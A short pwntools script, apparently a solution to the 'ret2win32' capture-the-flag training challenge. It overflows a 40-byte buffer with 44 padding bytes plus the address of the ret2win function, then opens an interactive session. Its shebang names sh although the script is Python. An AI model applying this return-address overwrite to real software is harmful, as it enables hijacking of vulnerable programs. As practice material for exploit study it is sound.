#!/bin/sh
from pwn import *
exe = ELF('./ret2win32')
p = process('./ret2win32')
for i in range(6):
	print(p.recvline(timeout=1).decode('utf-8'))
# buffer overflow of 40 char buffer
# address at 44 overwrites the buffer
ret2win = exe.symbols['ret2win']
log.info('ret2win() is at: '+str(hex(ret2win)))
exploit = b'\x90'*44+p32(ret2win)
p.sendline(exploit)
p.interactive()
p.close()
